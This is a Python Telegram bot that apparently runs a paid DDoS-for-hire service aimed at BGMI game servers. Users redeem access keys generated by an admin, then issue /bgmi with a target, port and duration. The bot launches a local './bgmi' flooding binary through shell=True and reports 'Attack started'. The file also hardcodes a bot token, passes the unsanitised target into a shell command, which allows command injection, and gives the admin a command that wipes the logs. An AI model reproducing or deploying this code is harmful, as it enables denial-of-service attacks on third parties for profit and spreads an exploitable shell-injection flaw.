from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters
import subprocess
import datetime
import os
import random
import string
import json

# Insert your Telegram bot token here
TOKEN = '7877458054:AAFaaZKMud2u-95QdEjA6ws82GBe7gx3SLA'
admin_id = {7769457936}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"

# Cooldown settings
COOLDOWN_TIME = 30  # in seconds
CONSECUTIVE_ATTACKS_LIMIT = 10
CONSECUTIVE_ATTACKS_COOLDOWN = 250  # in seconds

# In-memory storage
users = {}
keys = {}
bgmi_cooldown = {}
consecutive_attacks = {}

# Read users and keys from files initially
def load_data():
    global users, keys
    users.update(read_users())
    keys.update(read_keys())

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as file:
        file.write(f"UserID: {user_id}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared successfully."
    return "Logs were already empty."

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command Handlers
def start(update: Update, context: CallbackContext):
    user_name = update.effective_user.first_name
    update.message.reply_text(f"Hello {user_name}! Welcome to the bot.")

def generate_key_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in admin_id:
        try:
            time_amount = int(context.args[0])
            time_unit = context.args[1].lower()
            if time_unit == 'hours':
                expiration_date = add_time_to_current_date(hours=time_amount)
            elif time_unit == 'days':
                expiration_date = add_time_to_current_date(days=time_amount)
            else:
                raise ValueError("Invalid time unit")
            key = generate_key()
            keys[key] = expiration_date
            save_keys()
            update.message.reply_text(f"Key generated: {key}\nExpires on: {expiration_date}")
        except (IndexError, ValueError):
            update.message.reply_text("Usage: /genkey <amount> <hours/days>")
    else:
        update.message.reply_text("You do not have permission to use this command.")

def redeem_key_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    try:
        key = context.args[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            update.message.reply_text(f"Key redeemed successfully! Access granted until: {users[user_id]}")
        else:
            update.message.reply_text("Invalid or expired key.")
    except IndexError:
        update.message.reply_text("Usage: /redeem <key>")

def bgmi_command(update: Update, context: CallbackContext):
    user_id = str(update.effective_user.id)
    if user_id not in users:
        update.message.reply_text("You do not have access. Please redeem a key first.")
        return

    expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
    if datetime.datetime.now() > expiration_date:
        update.message.reply_text("Your access has expired. Please redeem a new key.")
        return

    if user_id not in admin_id:
        if user_id in bgmi_cooldown:
            time_since_last_attack = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
            if time_since_last_attack < COOLDOWN_TIME:
                cooldown_remaining = COOLDOWN_TIME - time_since_last_attack
                update.message.reply_text(f"Wait {cooldown_remaining} seconds before using /bgmi again.")
                return

            if consecutive_attacks.get(user_id, 0) >= CONSECUTIVE_ATTACKS_LIMIT:
                if time_since_last_attack < CONSECUTIVE_ATTACKS_COOLDOWN:
                    cooldown_remaining = CONSECUTIVE_ATTACKS_COOLDOWN - time_since_last_attack
                    update.message.reply_text(f"You have exceeded the attack limit. Wait {cooldown_remaining} seconds before trying again.")
                    return
                else:
                    consecutive_attacks[user_id] = 0

        bgmi_cooldown[user_id] = datetime.datetime.now()
        consecutive_attacks[user_id] = consecutive_attacks.get(user_id, 0) + 1

    try:
        target = context.args[0]
        port = int(context.args[1])
        time = int(context.args[2])
        if time > 300:
            update.message.reply_text("Error: Maximum allowed time is 300 seconds.")
            return

        log_command(user_id, target, port, time)
        command = f"./bgmi {target} {port} {time}"
        subprocess.run(command, shell=True)
        update.message.reply_text(f"Attack started on target: {target}, Port: {port}, Duration: {time} seconds.")
    except (IndexError, ValueError):
        update.message.reply_text("Usage: /bgmi <target> <port> <time>")

def clear_logs_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in admin_id:
        response = clear_logs()
        update.message.reply_text(response)
    else:
        update.message.reply_text("You do not have permission to clear logs.")

def main():
    load_data()
    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher

    # Command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("genkey", generate_key_command))
    dispatcher.add_handler(CommandHandler("redeem", redeem_key_command))
    dispatcher.add_handler(CommandHandler("bgmi", bgmi_command))
    dispatcher.add_handler(CommandHandler("clearlogs", clear_logs_command))

    # Start the bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
